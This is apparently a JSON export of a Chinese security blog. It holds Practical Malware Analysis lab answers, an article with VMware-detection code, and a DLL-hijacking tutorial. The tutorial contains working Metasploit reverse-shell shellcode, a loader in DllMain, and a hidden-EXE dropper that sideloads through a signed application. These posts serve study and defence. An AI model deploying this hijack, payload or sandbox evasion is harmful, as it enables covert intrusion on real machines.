什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？分析中说的那个编码，它不是base64编码， 优点是自制的编码方式，缺点不知道，还是借用书上的答案吧。 6. 这个恶意代码会接收哪些命令？分析中分析的，会有四种命令，执行四种操作。 7. 这个恶意代码的目的是什么？远控木马，会根据命令来执行不同的操作。 8. 本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？不太懂，借用书上的答案 9. 什么样的网络特征集应该被用于检测恶意代码？主要就是域名和其中的一些参数吧","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"“白加黑”DLL劫持","slug":"“白加黑”DLL劫持","date":"2021-10-11T08:50:39.000Z","updated":"2021-10-14T02:09:55.026Z","comments":true,"path":"2021/10/11/“白加黑”DLL劫持/","link":"","permalink":"https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/","excerpt":"","text":"前言DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑“的DLL。 原理DLL劫持的原理主要就是windows下加载DLL的顺序。在加载DLL的时候，系统会依次从以下六个位置去查找所需要的DLL文件 程序所在目录 系统目录 16位系统目录 Windows目录 当前目录 PATH环境变量中的各个目录 只要可以将准备好的DLL放在特定的目录下，先于原先的DLL被加载，就会实现劫持。 不过在win7之后，微软为了防御DLL劫持，将一些容易被劫持的DLL写入了一个注册表中HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs，在这里的DLL都会被禁止从程序所在目录下调用，只可以在系统目录下调用。 一些要求要实现“白加黑”的话，DLL最好是有很少的导出函数，或是对于一个白应用来说不是必需的DLL，没有此DLL还是可以打开程序正常运行，这样的话都不需要进行函数的转发。白应用调用的自己编写的DLL最好也比较少，这样更加方便。 实践在这里可以使用工具来进行查找，使用Process Monitor工具。 根据刚才所讲，那么我们理清一下思路，现在需要找到一个可以使用的DLL，那么将某个白应用放在一个目录下，然后使用工具观察其加载DLL的情况，如果它尝试从当前目录下去加载某个DLL，那么可以尝试构造同名DLL来进行劫持。 在Process Monitor中设置一些过滤条件 Include Operation is CreateFile Operation is LoadImage Path contains .dll Exclude Result is SUCCESS 这里我随便在网上找了一个某播放器的安装包，是一个带数字签名的白应用，其次这个安装包也不带任何DLL。可以看到在启动它的时候，尝试在我这个123目录下寻找几个DLL，那么可以尝试伪造一下。 写一个弹计算器的DLL，然后改名为SHFOLDER.dll，具体哪个DLL名字可以用，还需要去实际测试，我试第一个VERSION并不可行，用这个是可以的。 1234567891011121314151617181920// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: WinExec(&quot;calc.exe&quot;, SW_NORMAL); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 点击运行一下查看效果，成功弹出了计算机。 然后在测试的时候，后台的浏览器一直是开着的，查看Process Monitor的时候，发现了一个浏览器的更新程序也在寻找一个DLL，这个也可以拿来利用， 并且这个程序很小，只有一百五十多KB。 现在来尝试一下利用MSF生成一个远控木马，来操作下。 然后把它写进DLL中，让DLL启动直接执行这段shellcode。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;unsigned char shellcode[] =&quot;\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x64\\x8b\\x52\\x30\\x89\\xe5&quot;&quot;\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff&quot;&quot;\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49&quot;&quot;\\x75\\xef\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78&quot;&quot;\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x8b\\x48\\x18\\x50\\x8b\\x58\\x20\\x01\\xd3&quot;&quot;\\x85\\xc9\\x74\\x3c\\x31\\xff\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xc1&quot;&quot;\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24&quot;&quot;\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c&quot;&quot;\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59&quot;&quot;\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d&quot;&quot;\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26&quot;&quot;\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68&quot;&quot;\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\xca\\x84\\x68\\x02&quot;&quot;\\x00\\x11\\x5c\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea&quot;&quot;\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61&quot;&quot;\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00&quot;&quot;\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83&quot;&quot;\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a&quot;&quot;\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57&quot;&quot;\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68\\x00&quot;&quot;\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68&quot;&quot;\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff&quot;&quot;\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb&quot;&quot;\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5&quot;;void run()&#123; LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(Memory, shellcode, sizeof(shellcode)); ((void(*)())Memory)();&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: run(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 然后在服务端开启监控，这个时候就出现了问题，这边好像是一直发包发不过去，就没办法了，我也不知道是哪里出问题了。但是我用一个EXE进行测试，发现是没有任何问题的，于是，我就想到不如把EXE放在DLL的资源节里，然后“白加黑”释放资源，再打开exe好了。 将shellcode编写成一个exe，然后把它放到DLL的资源节中，当加载DLL的时候释放此exe在运行它。 释放资源 释放资源这里，一定一定要注意DLL释放资源和EXE是不同的，FindResource这几个函数第一个参数千万不能是NULL，这里要是DLL的句柄，我在这卡了好久，才发现问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445BOOL Free(UINT uResourceId, WCHAR* szResourceType, char* szFileName)&#123; //如果是DLL的资源释放，必须加载DLL的句柄！！！！ HMODULE hDll = GetModuleHandle(L&quot;goopdate.dll&quot;); // 找到资源 HRSRC hRsrc = FindResource(hDll, MAKEINTRESOURCE(uResourceId), szResourceType);//第一个参数不能是NULL，不然的话无法搜索到资源，其他同样 if (hRsrc == NULL) &#123; return FALSE; &#125; // 获取资源大小 DWORD dwSize = SizeofResource(hDll, hRsrc); if (dwSize &lt;= 0) &#123; return FALSE; &#125; // 载入资源 HGLOBAL hGlobal = LoadResource(hDll, hRsrc); if (hGlobal == NULL) &#123; return FALSE; &#125; // 锁定资源，并返回指向资源第一字节的指针 LPVOID lpRes = LockResource(hGlobal); if (lpRes == NULL) &#123; return FALSE; &#125; //创建一个隐藏文件 HANDLE hFile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL); if (hFile == NULL) &#123; return FALSE; &#125; DWORD dwWriten = 0; BOOL bRes = WriteFile(hFile, lpRes, dwSize, &amp;dwWriten, NULL); if (bRes == FALSE || dwWriten &lt;= 0) &#123; return FALSE; &#125; CloseHandle(hFile); CloseHandle(hGlobal); CloseHandle(hRsrc); return TRUE;&#125; 启动进程 12345678910111213141516171819BOOL Create(WCHAR* szFileName)&#123; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); ZeroMemory(&amp;pi, sizeof(pi)); si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; //隐藏窗口启动释放的exe BOOL flag = CreateProcess(szFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi); if (flag) &#123; CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return TRUE; &#125; return FALSE;&#125; 然后编译，再改名为要劫持的DLL就可以了。 将DLL属性设置为隐藏，双击运行后，会释放出加载shellcode的exe，其属性也是隐藏，然后再执行，就成功上线了。 更正经过指正，应该是我的DLL编写的有问题，并且劫持是可以去劫持一个具体的函数的，需要自己去分析一下白应用查看其调用的DLL以及其中函数。 使用IDA打开白应用，搜索loadlibrary，然后可以看到加载了要被劫持的DLL，goopdate.dll，以及获取其中的DllEntry函数。 然后在DLL中构造同名的导出函数DllEntry，将加载shellcode的代码放在其中，就可以成功了，这里就不再放截图了。 总结不过暂时应该还是没有办法过杀软的，因为这个shellcode肯定是会被检测到的，不过免杀不在本篇考虑的范畴内。还有就是DLL的编写，应该是要先分析一下白应用查看其加载的具体函数，然后再编写同名导出函数，在其中实现自己的功能。应该还有其他的方法，不过目前我还没有掌握，慢慢学习吧。 参考链接https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21 https://security.tencent.com/index.php/blog/msg/20 https://blog.csdn.net/mengyafei43/article/details/10340689 https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc","categories":[{"name":"DLL劫持","slug":"DLL劫持","permalink":"https://b1ackie.cn/categories/DLL%E5%8A%AB%E6%8C%81/"}],"tags":[{"name":"DLL劫持","slug":"DLL劫持","permalink":"https://b1ackie.cn/tags/DLL%E5%8A%AB%E6%8C%81/"}]},{"title":"恶意代码分析实战-实验13","slug":"恶意代码分析实战-实验13","date":"2021-10-08T07:15:15.000Z","updated":"2021-10-13T02:41:08.486Z","comments":true,"path":"2021/10/08/恶意代码分析实战-实验13/","link":"","permalink":"https://b1ackie.cn/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/","excerpt":"","text":"Lab 13-1详细分析监控行为可以看到有大量的网络连接 使用wireshark抓取数据包，可以看到如图的数据包内容。可以看到域名www.practicalmalwareanalysis.com还有get字段的内容V0lOLU5QTFE0SE9T。 使用IDA查看程序，可以看到有两个自定义的函数sub_401300，sub_4011C9。 来分析一下401300，可以看到从资源节中释放出来一些资源，然后调用sub_401190，分析此函数发现是一个与0x3B异或的过程。 资源节内容 异或后的结果，可以看到正是访问的域名。 使用IDA FindCrypt插件可以看到此程序有base64 找到地方发现正是第二个函数sub_4011C9之中。发现其进行编码的内容是通过gethostname函数获得的主机名。 base64过程 查看编码后的内容正是get字段的内容。 继续分析后面的函数，可以看到会访问这个URLwww.practicalmalwareanalysis.com/V0lOLU5QTFE0SE9T ，然后会调用InternetReadFile来读取返回的数据，如果返回的数据等于0x6F也就是o的话，那么返回值result就不等于0，就会终止外面的循环。 1.比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？查看字符串，可以看到base64所用码表，Mozilla/4.0，http://%s/%s，这几个。加密的话就是base64加密，加密元素从这里不太好分析出来。 2.使用IDA pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？4011B8处是3B在进行异或，那么这里重点关注一下，跟进后就是前面分析的xor解密。 3.恶意代码使用什么密钥加密，加密了什么内容？使用的是base64加密，加密的是主机名 4.使用静态工具FindCrypt2，Krypto ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？可以发现base64加密 5.什么类型的加密被恶意代码用来发送部分网络流量？base64加密 6.Base64编码函数在反汇编的何处？在反汇编的401000处 7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？最大长度是12，注意这里的strncpy函数，指定了长度，为12，所以最大是12。加密的内容就是主机名 8.恶意代码中，你是否在Base64加密数据中看到了填充字符（=或者==）？并没有看到填充的字符，因为我这里主机名正好为12位，根据base64编码的特性可以知道，是每三位变为四位，所以12位刚好扩充为16位无需填充，但是如果主机名不足12位，且其不能被3整除，就会出现填充字符。 9.这个恶意代码做了什么？从资源节解密出一个域名，然后通过base64加密主机名，再和域名拼接形成一个URL，访问此URL，直到返回一个特定数据才会结束。 Lab 13-2详细分析使用火绒剑，可以看到有创建文件的行为，每隔一小会就会创建一个看起来是随机名称的文件。 使用IDA插件FindCrypt查找是否存在加密，没有找到 查看主函数，看到流程很短，while循环是一个死循环，其中有两个sleep函数，还有一个sub_401851函数，根据火绒剑的结果分析，隔一段时间创建文件应该就是sleep函数的原因。那么这个函数应该就是创建文件的函数。 查看此函数，可以看到其中有一个GetTickCount函数，此函数获取自系统启动以来的毫秒数，然后将其拼接成为文件名tempXXX，这就解释了刚才看到那些文件名是怎么回事了。 看sub_401070函数，这是一个生成当前的屏幕截图的函数，在其中进行截图操作。 而sub_40181F函数就是加密的函数，查看其传入的参数也是内容和大小 现在尝试在加密之前将图像内容给dump出来，在加密函数之前可以看到传入的参数分别是要加密的内容和大小 在lordpe中转存这部分区域，之后改为BMP格式即可看到图片，确实是当前的截图 1.使用动态分析，确定恶意代码创建了什么？每隔一会会创建一个tempXXX文件 2.使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？没有找到很有用的东西 3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？CreateFile和WriteFile 4.加密函数在反汇编的何处？40181F 5.从加密函数追溯原始的加密内容，原始加密内容是什么？原始的加密内容是屏幕截图 6.你是否能够找到加密算法？如果没有，你如何解密这些内容？加密算法就在40181F中，可以在加密之前将内容dump出来 7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？如详细分析中所述，那样操作。","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"虚拟机检测","slug":"虚拟机检测","date":"2021-09-28T02:14:54.000Z","updated":"2021-09-30T02:21:01.978Z","comments":true,"path":"2021/09/28/虚拟机检测/","link":"","permalink":"https://b1ackie.cn/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/","excerpt":"","text":"前言现在虚拟机的应用是越来越广泛了，不论是现在流行的网游还是一些病毒都会有自己的反虚拟机机制，判断其是否是运行在虚拟机之中。我现在也学习并记录一下一些虚拟机检测的手段，因为我只使用过VMware，所以我这里只记录自己对于VMware的检测，其他类型的虚拟机暂时没有用过，所以先暂且不提。 我个人对于虚拟机检测的理解，就是检测其中的各种特征，因为虚拟机运行和真实环境是有差距的，比如一些特定的服务，硬件名称等。 进程在虚拟机中运行的时候，是有特定的进程的，比如图中两个进程 这时就可以编写代码去检测是否存在指定的进程。 12345678910111213141516171819BOOL IfProcExist(WCHAR* Procname)&#123; PROCESSENTRY32 pe32 = &#123; 0 &#125;; pe32.dwSize = sizeof(PROCESSENTRY32); HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//拍摄快照 BOOL flag = Process32First(hSnap, &amp;pe32); while (flag) &#123; if (!wcscmp(Procname, pe32.szExeFile))//判断是否是指定进程 &#123; return TRUE;//找到返回TRUE &#125; else &#123; flag = Process32Next(hSnap, &amp;pe32);//没有找到搜索下一个 &#125; &#125; return FALSE;//没有找到，不存在指定进程，返回FALSE&#125; 当在虚拟机运行时，检测到存在指定的进程 不过这两个进程都是vmtool的进程，当我把vmtool卸载之后，就没有这两个进程了。所以如果在一个没有vmtool的环境中，可能还需要去寻找其他的一些特征来进行检测。 注册表虚拟机环境中也有许多的标志是虚拟机的注册表，可以通过查询这些注册表来判断是否处在虚拟环境之中。 比如HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Drivers这个表项 可以通过尝试打开此表项，判断是否存在来作为判断依据。 123456789BOOL OpenReg()&#123; HKEY hKey; if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\VMware, Inc.\\\\VMware Drivers&quot;, 0, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)//是否能打开此表项 &#123; return FALSE;//打不开返回FALSE &#125; return TRUE;//打开返回TRUE&#125; 同时经过我测试发现，此表项也是vmtool的表项，如果卸载掉vmtool的话，此表项就不存在了。不过可用于判断的注册表项有许多，可以自己进行搜索并且实验来进行判断。我这里找到了如图的这个表项，应该是bios信息。那么可以根据这个来进行判断，比如查询SystemManufacturer中的值是否是VMware, Inc.来判断是否是虚拟机。 123456789101112131415161718BOOL CheckRegValue()&#123; HKEY hKey; if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L&quot;HARDWARE\\\\DESCRIPTION\\\\System\\\\BIOS&quot;, 0, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)//打开注册表 &#123; return FALSE; &#125; DWORD dwType; WCHAR data[100]; DWORD len = 100; RegQueryValueEx(hKey, L&quot;SystemManufacturer&quot;, NULL, &amp;dwType, (BYTE*)data, &amp;len);//查询键值 RegCloseKey(hKey); if (wcscmp(data, L&quot;VMware, Inc.&quot;) == 0)//判断键值是否相等 &#123; return TRUE;//相等返回TRUE，虚拟机环境 &#125; return FALSE;&#125; 注册表里的信息非常的多，比如这里还有显卡的相对应信息，显卡名称，这也可以用来检测。具体的话，可以自己在虚拟机中的注册表内查找可以用于检测的特征。 MAC地址虚拟机的MAC地址是有特定的特征的，比如它们都是固定的开头 00:50:56:XX:XX:XX00:1C:14:XX:XX:XX00:0C:29:XX:XX:XX00:05:69:XX:XX:XX 那么就可以通过判断当前系统的MAC地址的开头地址来判断是否处于虚拟机之中。 12345678910111213141516BOOL CheckMacAddr()&#123; ULONG ulSize = 0; PIP_ADAPTER_INFO pInfo = NULL; GetAdaptersInfo(pInfo, &amp;ulSize);//获取缓冲区大小 pInfo = (PIP_ADAPTER_INFO)malloc(ulSize); GetAdaptersInfo(pInfo, &amp;ulSize);//获取适配器信息 if ((pInfo-&gt;Address[0] == 0x00 &amp;&amp; pInfo-&gt;Address[1] == 0x50 &amp;&amp; pInfo-&gt;Address[2] == 0x56) || (pInfo-&gt;Address[0] == 0x00 &amp;&amp; pInfo-&gt;Address[1] == 0x1C &amp;&amp; pInfo-&gt;Address[2] == 0x14) || (pInfo-&gt;Address[0] == 0x00 &amp;&amp; pInfo-&gt;Address[1] == 0x0C &amp;&amp; pInfo-&gt;Address[2] == 0x29) || (pInfo-&gt;Address[0] == 0x00 &amp;&amp; pInfo-&gt;Address[1] == 0x05 &amp;&amp; pInfo-&gt;Address[2] == 0x69))//判断MAC地址前几位是否相同 &#123; return TRUE;//相同返回TRUE &#125; return FALSE;&#125; 特定的文件在虚拟机中有一些驱动文件，可以通过查询这些文件是否存在来判断。 也不仅仅是这些驱动的文件，可以通过自己的查找，用其他的一些文件来做特征。 12345678BOOL IfFileExist(char* FilePath)&#123; if (_access(FilePath, 0) == 0)//判断文件是否存在,0代表仅检查是否存在 &#123; return TRUE;//存在返回TRUE &#125; return FALSE;&#125; 网关检测一般虚拟机中的网关地址如果不进行修改的话，最后一位都是2，那么可以通过检测网关地址的最后一位是否是2，来进行判断当前运行的环境。 1234567891011121314151617BOOL CheckGateway()&#123; ULONG ulSize = 0; PIP_ADAPTER_INFO pInfo = NULL; GetAdaptersInfo(pInfo, &amp;ulSize);//获取缓冲区大小 pInfo = (PIP_ADAPTER_INFO)malloc(ulSize); GetAdaptersInfo(pInfo, &amp;ulSize);//获取适配器信息 char IP[100]; sprintf(IP, &quot;%s&quot;, pInfo-&gt;GatewayList.IpAddress.String);//网关的信息 int len = strlen(IP); char* a = &amp;IP[len - 1]; if (strcmp(&quot;2&quot;, a) == 0)//判断最后一位是否等于2 &#123; return TRUE;//相等返回TRUE &#125; return FALSE;&#125; 特权指令Vmware为主机与虚拟机之间提供了相互沟通的通讯机制，它使用“IN”指令来读取特定端口的数据以进行两机通讯，但由于IN指令属于特权指令，在处于保护模式下的真机上执行此指令时，除非权限允许，否则将会触发类型为“EXCEPTION_PRIV_INSTRUCTION”的异常，而在虚拟机中并不会发生异常，在指定功能号0A（获取VMware版本）的情况下，它会在EBX中返回其版本号“VMXH”，可以通过此返回值判断是否处于虚拟机中。 1234567891011121314151617181920212223242526272829BOOL CheckIN()&#123; BOOL flag = FALSE; __try &#123; __asm &#123; pushad mov eax,&#x27;VMXh&#x27; xor ebx,ebx mov ecx,0x0A //功能号0x0A mov edx,&#x27;VX&#x27; in eax,dx cmp ebx,&#x27;VMXh&#x27; //判断返回值是否是VMXh je _vm //是的话返回TRUE jmp _exit _vm: mov eax,TRUE mov flag,eax _exit: popad &#125; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; flag = FALSE; &#125; return flag;&#125; CPUID当eax=1时，运行CPUID之后，ecx中的值（转为二进制）如果最高位为1，那么就是在虚拟环境，否则不是。 12345678910111213141516171819202122BOOL CPUID()&#123; BOOL flag; __asm &#123; pushad pushfd mov eax,1 cpuid and ecx,0x80000000 //只留最高位进行判断 test ecx,ecx //判断ecx寄存器是否为空，为空代表非虚拟机环境返回FALSE，否则返回TRUE jz _Not mov flag,TRUE jmp _end _Not: mov flag,FALSE _end: popfd popad &#125; return flag;&#125; 当eax中的值是0x40000000时，ebx、ecx、edx三个寄存器中的返回值加起来正好是“VMWareVMWare”，可以把这个程序拖入OD，直接进行修改来查看。 总结总结了一些可以使用的虚拟机检测的方式，但是感觉还是比较片面的，其中一些检测的特征也可以通过手动的方式来进行修改。 感觉反虚拟机还是游戏方面做的更好一些，如果能把网游反虚拟机的机制学习清楚的话应该还能学到更多的东西。 参考链接http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/ https://www.freebuf.com/articles/system/202717.html https://www.write-bug.com/article/1822.html https://bbs.pediy.com/thread-219955.htm","categories":[{"name":"虚拟机检测","slug":"虚拟机检测","permalink":"https://b1ackie.cn/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"虚拟机检测","slug":"虚拟机检测","permalink":"https://b1ackie.cn/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"},{"name":"编程","slug":"编程","permalink":"https://b1ackie.cn/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"恶意代码分析实战-实验12","slug":"恶意代码分析实战-实验12","date":"2021-09-23T06:12:55.000Z","updated":"2021-09-24T09:16:58.245Z","comments":true,"path":"2021/09/23/恶意代码分析实战-实验12/","link":"","permalink":"https://b1ackie.cn/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/","excerpt":"","text":"Lab 12-1详细分析打开程序后，每隔一段时间都会弹出一个窗口 使用火绒剑监控行为，发现其有注入的行为。可以看到注入的进程是Explorer.exe 可以看出来它获取了explorer的PID然后进行了DLL注入，注入的DLL为Lab12-01.dll。它获得进程PID的方式是通过EnumProcesses、EnumProcessModules、GetModuleBaseNameA这三个函数实现的。首先通过EnumProcesses获得所有进程的PID，然后打开每个进程，再通过EnumProcessModules、GetModuleBaseNameA获取进程名字，再和explorer.exe进行比较判断。 现在来分析一下注入的DLL文件，DLLMAIN中创建了一个新的线程。 新的线程，会拼接一个字符串，也就是前面弹出窗口的标题的次数，会无限制的增长，那么创建的这个新线程应该就是弹窗函数了，进去看果然如此，最后调用sleep函数。 1.在你运行恶意代码可执行文件时，会发生什么？会将Lab12-01.dll注入到explorer.exe中，然后每隔一分钟弹出一个窗口。 2.哪个进程会被注入explorer.exe 3.你如何能够让恶意代码停止弹出窗口重新启动explorer.exe 4.这个恶意代码样本是如何工作的？它会进行远程线程注入将Lab12-01.dll注入到explorer.exe中，然后每分钟都会弹出一个窗口。 Lab 12-2详细分析看到Main函数流程较短 首先获得了svchost.exe的路径 然后是从资源节读取了数据，然后有判断，如果开头不是MZ的话，会调用401000函数。 进入查看，可以看到是一个异或解密，那么这个资源节中的数据是异或0x41进行加密。 之后就是一个傀儡进程的创建，将shellcode注入到svchost.exe中 把shellcodedump出来分析一下，发现是一个键盘记录的程序 查看挂钩函数fn 记录键盘输入内容 1.这个程序的目的是什么？注入shellcode到svchost.exe，实现键盘钩子 2.启动器恶意代码是如何隐蔽执行的？将shellcode注入到svchost.exe，实现了一个傀儡进程。 3.恶意代码的负载存储在哪里？存储在资源节之中 4.恶意负载是如何被保护的？与0x41异或加密了 5.字符串列表是如何被保护的？这个问题我没看懂，看了书上的答案，书上说是401000处函数，进行XOR编码。那个函数实际上就是解密shellcode的函数。所以它的意思应该是，shellcode中的字符串是如何被保护的。 Lab 12-3这就是Lab 12-2中的shellcode，刚才已经详细分析过了，就不再进行分析了。 1.这个恶意负载的目的是什么？键盘记录 2.恶意负载是如何注入自身的？这个我也没看懂，没明白什么叫注入自身，因为没看到注入行为，看了书上的答案，意思是 挂钩注入，来偷取击键记录 原来是这样，好吧… 3.这个恶意程序还创建了哪些其他文件？创建了practicalmalwareanalysis.log文件，来记录。 Lab 12-4详细分析打开发现其前部分与Lab12-1是一致的，就不再进行分析饿了，只是在401000中是winlogon.exe，也就是前面这部分是获取winlogon.exe的PID 现在来分析一下后面的部分 首先是进行了提权，判断是否有SeDebugPrivilege权限，如果没有的话会进行提权。 然后会进行远程线程注入，注入函数是sfc_os.dll中的序号为2的函数， 然后会移动文件 最后是一个资源释放，释放到C:\\Windows\\system32\\wupdmgr.exe，并且隐藏窗口启动它。 把资源节中的程序dump下来分析，首先看到启动了winup.exe也就是原始的wupdmgr.exe，然后会访问http://www.practicalmalwareanalysis.com/updater.exe ，进行下载更新恶意代码。 1.位置0x401000的代码完成了什么功能判断当前进程的PID是否是winlogon.exe 2.代码注入了哪些进程？winlogon.exe 3.使用LoadLibraryA装载了哪个DLL程序？sfc_os.dll 4.传递给CreateRemoteThread调用的第四个参数是什么？sfc_os.dll中的序号为2的函数，是一个名为SfcTerminateWatcherThread的函数，用来关闭windows的文件保护。 5.二进制主程序释放出了哪个恶意代码？wupdmgr.exe，原始的wupdmgr.exe被放到了temp目录下，重命名为了winup.exe 